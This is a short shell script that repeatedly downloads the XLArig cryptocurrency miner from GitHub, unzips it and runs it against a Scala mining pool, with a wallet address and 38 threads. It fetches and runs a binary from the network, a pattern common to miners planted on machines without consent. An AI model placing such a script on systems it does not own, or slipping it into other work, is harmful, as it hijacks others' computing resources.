#!/bin/sh

COUNTER=20
until [  $COUNTER -lt 10 ]; do
            
wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o scala.herominers.com:10131 -u SvmKJ6FG2YhhXtiTgnhP72XCjwsEjirdDbA54mYvzADnXTAk1TjC4Nn9a7iWqXjw5VJSPRvjTn9jATD54nbxuW6e1qRc6eSgJ -p jokeer -a panthera -k -t38




     echo COUNTER $COUNTER
     let COUNTER-=1
done
